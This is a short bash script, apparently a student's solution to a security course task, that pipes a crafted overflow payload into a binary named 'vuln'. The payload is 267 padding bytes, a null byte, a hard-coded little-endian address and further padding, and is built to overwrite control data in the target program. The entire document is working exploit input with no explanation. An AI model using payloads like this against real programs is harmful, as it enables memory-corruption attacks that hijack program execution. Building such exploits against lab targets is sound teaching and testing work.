#!/usr/bin/env bash
python -c "print('a' * 267 + '$(echo '00' | sed 's/../\\x&/g')' + '\xe4\x88\xff\x43' + 'a' * 267)" | /task1/s1828233/vuln
